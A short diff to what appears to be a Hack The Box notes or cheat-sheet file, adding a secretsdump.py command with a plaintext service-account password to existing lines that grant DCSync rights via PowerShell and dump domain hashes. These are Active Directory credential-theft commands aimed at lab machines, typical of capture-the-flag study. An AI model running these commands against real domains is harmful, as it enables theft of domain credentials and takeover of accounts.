@@ -19,4 +19,5 @@
       $cred = New-Object System.Management.Automation.PSCredential('htb\rana', $pass)
       Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity rana -Rights DCSync
     - secretsdump.py htb.local/rana:password@10.10.10.161
+    - secretsdump.py EGOTISTICAL-BANK.LOCAL/'svc_loanmgr:Moneymakestheworldgoround!'@10.10.10.175
 
